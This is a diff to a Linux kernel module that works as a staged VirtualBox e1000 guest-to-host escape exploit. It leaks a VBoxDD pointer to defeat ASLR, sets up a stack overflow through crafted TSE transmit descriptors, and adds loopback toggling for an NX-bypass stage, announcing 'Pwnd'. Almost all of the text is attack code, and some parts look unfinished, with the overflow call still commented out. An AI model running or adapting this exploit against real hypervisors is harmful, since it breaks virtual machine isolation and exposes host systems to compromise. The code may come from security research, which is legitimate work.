@@ -21,7 +21,7 @@ MODULE_SUPPORTED_DEVICE("none");
 MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
-#define LEAKED_VBOXDD_VAO 0x330E00
+#define LEAKED_VBOXDD_VAO 0x331000
 
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
@@ -33,6 +33,8 @@ static void write_primitive(uint16_t address, uint16_t value);
 static uint64_t aslr_bypass(void);
 static void stack_overflow(void);
 static void nx_bypass(void);
+static void enable_loopback(void);
+static void disable_loopback(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t * bar0, * tx_buffer;
@@ -53,16 +55,15 @@ uint16_t mu16Data[64] =
 /* ------------------------------ Constructor ----------------------------- */
 static int __init e1k_init(void)
 {
-	uint64_t res; 
-
 	bar0 = map_mmio();
 	if (!bar0) {
 		pr_info("e1k : failed to map mmio");
 		return -1;
 	}
-	e1k_configure();
+	e1k_configure();	
 	aslr_bypass();
-	//nx_bypass();
+
+	nx_bypass();
 	
 	pr_info("Pwnd");
 	return 0;
@@ -106,7 +107,7 @@ static void e1k_configure(void)
 	ctrl = get_register(CTRL) | CTRL_RST;
 	set_register(CTRL, ctrl);
 
-	ctrl = get_register(CTRL) | CTRL_ASDE | CTRL_SLU;
+	ctrl = get_register(CTRL) | CTRL_ASDE | CTRL_SLU | CTRL_FD;
 	set_register(CTRL, ctrl);
 
 	// Configure TX registers 
@@ -143,6 +144,20 @@ static void e1k_configure(void)
 
 	tctl = get_register(TCTL) | TCTL_EN | TCTL_PSP | ((0x40 << 12) & TCTL_COLD) | ((0x10 << 8) & TCTL_CT) | TCTL_RTLC;
 	set_register(TCTL, tctl);
+}
+
+static void enable_loopback(void)
+{
+	uint32_t rctl = get_register(RCTL);
+	rctl |= RCTL_LBM_TCVR;
+	set_register(RCTL, rctl);
+}
+
+static void disable_loopback(void)
+{
+	uint32_t rctl = get_register(RCTL);
+	rctl |= RCTL_LBM_NO;
+	set_register(RCTL, rctl);
 }
 
 /** heap_overflow : erase EEPROM writing address with new one
@@ -323,19 +338,15 @@ static void write_primitive(uint16_t address, uint16_t value)
 static uint64_t aslr_bypass(void)
 {
 	uint8_t leaked_bytes[8];
-	uint32_t rctl, i;
+	uint32_t i;
 	uint64_t leaked_vboxdd_ptr, vboxdd_base;
 
 	pr_info("##### Stage 1 #####\n");
 
-	// Set no loopback mode
-	rctl = get_register(RCTL) | RCTL_LBM_NO;
-	set_register(RCTL, rctl);
-
+	disable_loopback();
 	for (i = 0; i < 8; i++) {
 		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
 		leaked_bytes[i] = inb(0x4107);
-		//pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
 	}
 
 	leaked_vboxdd_ptr	= *((uint64_t *) leaked_bytes);
@@ -348,7 +359,6 @@ static uint64_t aslr_bypass(void)
 
 static void stack_overflow(void)
 {
-	uint8_t* 	buffer;
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
@@ -359,21 +369,17 @@ static void stack_overflow(void)
 	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
-	buffer = kmalloc(STACK_LEN, GFP_KERNEL);
 
-	buffer[STACK_LEN - 8] = 0x61;
-	buffer[STACK_LEN - 7] = 0x61;
-	buffer[STACK_LEN - 6] = 0x61;
-	buffer[STACK_LEN - 5] = 0x61;
-	buffer[STACK_LEN - 4] = 0x61;
-	buffer[STACK_LEN - 3] = 0x61;
-	buffer[STACK_LEN - 2] = 0x61;
-	buffer[STACK_LEN - 1] = 0x61;
+	//...
+	tx_buffer[PAYLOAD_LEN - 164]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 163]	= 0xc0;
+	tx_buffer[PAYLOAD_LEN - 152]	= 0x00;
+	tx_buffer[PAYLOAD_LEN - 151]	= 0x00;
+
 	//-----------------------------------------//
 
 	//----------- Descriptors setup -----------//
-	
-	physical_address = virt_to_phys(buffer);
+	physical_address = virt_to_phys(tx_buffer);
 
 	ctxt_1->lower_setup.ip_config	= (uint32_t) 0;
 	ctxt_1->upper_setup.tcp_config	= (uint32_t) 0;
@@ -387,12 +393,12 @@ static void stack_overflow(void)
 	data_3->buffer_addr				= (uint64_t) physical_address;
 	data_3->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
 	data_3->upper.data				= (uint32_t) 0;
-
+	
 	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
 	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
 	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
 	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
-
+	
 	data_5->buffer_addr				= (uint64_t) physical_address;
 	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
 	data_5->upper.data				= (uint32_t) 0;
@@ -403,20 +409,13 @@ static void stack_overflow(void)
 	tdt = (get_register(TDT) + 5) & 0xFFFF;
 	set_register(TDT, tdt);
 	//-----------------------------------------//
+	
 }
 
 static void nx_bypass(void)
 {
-	uint32_t rctl;
 	pr_info("##### Stage 2 #####\n");
-
-	// Set loopback mode
-	rctl = get_register(RCTL);// | RCTL_LBM_MAC | RCTL_LBM_SLP;
-	set_register(RCTL, rctl);
-
+	enable_loopback();
 	//stack_overflow();
-
-	// Disable loopback mode
-	rctl = get_register(RCTL);// & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
-	set_register(RCTL, rctl);
+	disable_loopback();
 }
